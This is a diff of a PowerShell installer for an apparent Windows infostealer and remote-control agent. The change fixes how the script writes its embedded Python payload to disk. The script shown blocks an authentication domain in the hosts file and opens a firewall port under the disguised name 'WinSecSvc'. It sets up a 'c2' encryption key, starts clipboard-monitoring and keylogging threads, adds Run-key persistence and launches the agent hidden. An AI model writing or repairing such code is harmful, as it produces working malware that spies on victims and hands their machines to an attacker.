@@ -119,16 +119,18 @@ Add-Content $h '127.0.0.1 www.sevenauthapi.com'
 ipconfig /flushdns|Out-Null
 netsh advfirewall firewall delete rule name="WinSecSvc"|Out-Null
 netsh advfirewall firewall add rule name="WinSecSvc" dir=in action=allow protocol=TCP localport=443|Out-Null
-@"@'
-import base64,ctypes,glob,hashlib,json,os,platform,re,secrets,shutil,socket,sqlite3,subprocess,sys,tempfile,threading,time,urllib.request,uuid,winreg
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+@"
 B="$BUCKET"
 PASS="$PASS"
 HOOK="$HOOK"
 DASH="$DASH"
 KEY="$KEY"
+"@ | Set-Content "$svc\$AGENT" -Encoding utf8
+@'
+import base64,ctypes,glob,hashlib,json,os,platform,re,secrets,shutil,socket,sqlite3,subprocess,sys,tempfile,threading,time,urllib.request,uuid,winreg
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 RES=B+"-r"
 CMD=B+"-c"
 K=HKDF(algorithm=hashes.SHA256(),length=32,salt=b"sv7",info=b"c2").derive(PASS.encode())
@@ -537,7 +539,7 @@ threading.Thread(target=clipmon,daemon=True).start()
 threading.Thread(target=keyloop,daemon=True).start()
 threading.Thread(target=agent,daemon=True).start()
 while True:time.sleep(3600)
-'@ | Set-Content "$svc\$AGENT" -Encoding utf8
+'@ | Add-Content "$svc\$AGENT" -Encoding utf8
 Copy-Item .\cert.pem "$svc\cert.pem" -Force
 New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $KEY -Value "`"$pyw`" `"$svc\$AGENT`"" -PropertyType String -Force|Out-Null
 Start-Process $pyw -ArgumentList "`"$svc\$AGENT`"" -WindowStyle Hidden
